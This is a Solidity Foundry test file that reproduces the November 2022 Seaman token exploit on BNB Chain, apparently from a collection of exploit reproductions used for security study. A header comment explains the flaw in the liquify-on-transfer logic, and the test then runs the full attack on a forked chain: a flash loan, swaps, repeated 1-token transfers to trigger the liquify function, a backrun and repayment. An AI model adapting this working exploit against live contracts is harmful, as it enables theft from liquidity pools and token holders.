// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";
import {IUniswapV2Router02} from "../../utils/IUniswapV2Router.sol";

// forge test --match-contract Exploit_Seaman -vvv
/*
On Nov 29, 2022 an attacker stole ~$7k in USDT tokens from an Seaman.
The attacker managed to manipulate a pair and sandwiching the token contract invoking liquify functions via
transfers.

// Attack Overview
Total Lost: ~$7k 
Attack Tx: https://bscscan.com/tx/0x6f1af27d08b10caa7e96ec3d580bf39e29fd5ece00abda7d8955715403bf34a8
Ethereum Transaction Viewer:
https://tx.eth.samczsun.com/binance/0x6f1af27d08b10caa7e96ec3d580bf39e29fd5ece00abda7d8955715403bf34a8

Exploited Contract: https://bscscan.com/address/0x6bc9b4976ba6f8c9574326375204ee469993d038
Attacker Address: https://bscscan.com/address/0x4b1f47be1f678076f447585beba025e3a046a9fa
Attacker Contract: https://bscscan.com/address/0x0E647d34c4caF61D9E377a059A01b5C85AB1d82a
Attack Block:  23467516

// Key Info Sources
Twitter: https://twitter.com/BeosinAlert/status/1597535796621631489
Code: https://bscscan.com/address/0x6bc9b4976ba6f8c9574326375204ee469993d038#code


Principle: Pool Manipulation, Market balance manipulation

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        ...
if( uniswapV2Pair.totalSupply() > 0 && balanceOf(address(this)) > balanceOf(address(uniswapV2Pair)).div(10000)
&& to == address(uniswapV2Pair)){
            if (
                !swapping &&
                _tokenOwner != from &&
                _tokenOwner != to &&
               !ammPairs[from] &&
                !(from == address(uniswapV2Router) && !ammPairs[to])&&
                swapAndLiquifyEnabled
            ) {
                swapping = true;
                swapAndLiquifyV3();
                swapAndLiquifyV1();
                swapping = false;
            }
        }
       ...
    }

VULNERABILITY
The attacker triggered the liquify function several times.
1) The non ERC20 compliant _transfer of Seaman triggers a swap regardless the amount being transferred.
2) The path of the swap is SEAMAN-BUSD-GVC which essentially manipulates the GVC price.

ATTACK:
Essentially, a sandwich attack
1) Flasloan
2) Manipulate the pair by removing tokens
3) Invoke liquify several times triggered by transfers
4) Backrun the pair

MITIGATIONS:
1) Prevent users to manipulate contract balances via low liquidity pair interactions.
*/
interface ISeaman is IERC20 {}

interface IDppOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address _assetTo, bytes memory data)
        external;
}

contract Exploit_Seaman is TestHarness, TokenBalanceTracker {
    ISeaman internal seaman = ISeaman(0x6bc9b4976ba6f8C9574326375204eE469993D038);
    IERC20 internal gvc = IERC20(0xDB95FBc5532eEb43DeEd56c8dc050c930e31017e);
    IERC20 internal usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);

    address internal pairUsdtSeaman = 0x6637914482670f91F43025802b6755F27050b0a6;
    IUniswapV2Router02 internal pancakeRouter = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    IDppOracle internal dppOracle = IDppOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);

    function setUp() external {
        cheat.createSelectFork(vm.envString("RPC_URL"), 23467515);
        cheat.deal(address(this), 0);

        addTokenToTracker(address(usdt));
        addTokenToTracker(address(seaman));
        addTokenToTracker(address(gvc));

        updateBalanceTracker(address(this));
    }

    function test_attack() external {
        console.log("===== STEP 1: REQUEST FLASHLOAN =====");
        uint256 amountToBorrow = usdt.balanceOf(address(dppOracle));

        dppOracle.flashLoan(0, amountToBorrow, address(this), hex"30");
    }

    function DPPFlashLoanCall(address arg0, uint256 arg1, uint256 arg2, bytes memory) external {
        require(msg.sender == address(dppOracle), "Only oracle");
        require(arg0 == address(this), "Only requested by this");

        uint256 usdtReceived = arg1 > 0 ? arg1 : arg2;
        console.log("===== STEP 2: FLASHLOAN RECEIVED =====");
        logBalancesWithLabel("Attacker Contract", address(this));
        logBalancesWithLabel("Seaman Contract", address(seaman));

        console.log("===== STEP 3: SWAP USDT/SEAMAN ON PANCAKE =====");
        usdt.approve(address(pancakeRouter), 10_000_000_000);
        address[] memory _tokens = new address[](2);
        _tokens[0] = address(usdt);
        _tokens[1] = address(seaman);

        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            10_000_000_000, 0, _tokens, address(this), block.timestamp
        );
        logBalancesWithLabel("Attacker Contract", address(this));
        logBalancesWithLabel("Seaman Contract", address(seaman));

        console.log("===== STEP 4: SWAP USDT/GVC ON PANCAKE =====");
        usdt.approve(address(pancakeRouter), 500_000 ether);
        _tokens[0] = address(usdt);
        _tokens[1] = address(gvc);

        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            500_000 ether, 0, _tokens, address(this), block.timestamp
        );
        logBalancesWithLabel("Attacker Contract", address(this));
        logBalancesWithLabel("Seaman Contract", address(seaman));

        console.log("===== STEP 5: SEND 40 SEAMAN TXS TO PANCAKE =====");
        for (uint256 i = 0; i < 12; i++) {
            // Foundry struggles to loop 40 times.
            require(seaman.transfer(address(pairUsdtSeaman), 1), "seaman transfer failed");
            // The profit increases with the amount of transfers, the attacker made 40 transfers.
        }

        console.log("===== STEP 6: SWAP GVC FOR USDT =====");
        uint256 gvcToSwap = gvc.balanceOf(address(this));
        gvc.approve(address(pancakeRouter), gvcToSwap);
        _tokens[0] = address(gvc);
        _tokens[1] = address(usdt);

        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            gvcToSwap, 0, _tokens, address(this), block.timestamp
        );
        logBalancesWithLabel("Attacker Contract", address(this));
        logBalancesWithLabel("Seaman Contract", address(seaman));

        console.log("===== STEP 7: REPAY LOAN =====");
        require(usdt.transfer(address(dppOracle), usdtReceived), "Failed to repay USDT loan");
        logBalancesWithLabel("Attacker Contract", address(this));
        logBalancesWithLabel("Seaman Contract", address(seaman));
    }
}
